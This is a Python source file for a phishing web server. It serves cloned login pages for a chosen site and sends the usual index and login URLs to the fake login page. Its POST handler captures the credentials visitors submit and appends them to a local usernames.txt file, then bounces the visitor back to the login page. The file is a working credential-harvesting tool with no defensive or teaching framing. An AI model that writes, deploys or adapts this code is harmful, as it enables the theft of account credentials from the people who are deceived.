from http.server import HTTPServer, SimpleHTTPRequestHandler
import time
import os
from os import curdir, sep

REDIRECT = ["/", "/index.php", "/index.html", "/login.html", "/login.php"]
SITE = ""

class MyServer(SimpleHTTPRequestHandler):
    def do_GET(self):
        files = os.listdir("pages/" + SITE)

        if self.path in REDIRECT:
            self.send_response(200)
            self.path = "/pages/" + SITE + "/login.html"
        elif self.path[1:] in files:
            self.send_response(200)
            self.path = "/pages/" + SITE + self.path
        elif self.path.startswith("/error/"):
            self.send_response(400)
        else:
            self.send_response(400)
            self.path = "/error/error.html"

        try:
			#Check the file extension required and
			#set the right mime type

            sendReply = False
            if self.path.endswith(".html"):
                mimetype='text/html'
                sendReply = True
            if self.path.endswith(".jpg"):
                mimetype='image/jpg'
                sendReply = True
            if self.path.endswith(".gif"):
                mimetype='image/gif'
                sendReply = True
            if self.path.endswith(".js"):
                mimetype='application/javascript'
                sendReply = True
            if self.path.endswith(".css"):
                mimetype='text/css'
                sendReply = True
            if self.path.endswith(".png"):
                mimetype='image/png'
                sendReply = True

            if sendReply == True:
                #Open the static file requested and send it
                with open(curdir + sep + self.path, 'rb') as f:
                    self.send_header('Content-type', mimetype)
                    self.end_headers()
                    self.wfile.write(f.read())

            return
        
        except IOError:
            self.send_error(404)

    def do_POST(self):
        if self.path in ["/login.php", "/pages/" + SITE + "/login.php"]:
            self.path = "/pages/" + SITE + "/login.php"

            content_length = int(self.headers.get('Content-Length', 0)) # <--- Gets the size of data
            post_data = self.rfile.read(content_length) # <--- Gets the data itself
            creds = post_data.decode('utf-8').replace('&', ', ')
            creds += '\n'

            with open(curdir + sep + "/usernames.txt", 'a') as f:
                f.write(creds)

            self.path = "/"
            self.do_GET()

        else:
            return

    def send_error(self, code, message=None):
        if code == 404:
            self.path = "/none"
            return self.do_GET()

def start(site, hostName = "localhost", serverPort = 8080):
    try:
        global SITE
        SITE = site

        webServer = HTTPServer((hostName, serverPort), MyServer)
        print("\nServer started http://%s:%s" % (hostName, serverPort))

        try:
            webServer.serve_forever()
        except KeyboardInterrupt:
            pass

        webServer.server_close()
        print("Server stopped.")

    except OSError:
        print("\nError! The server could not be bound to the address provided.")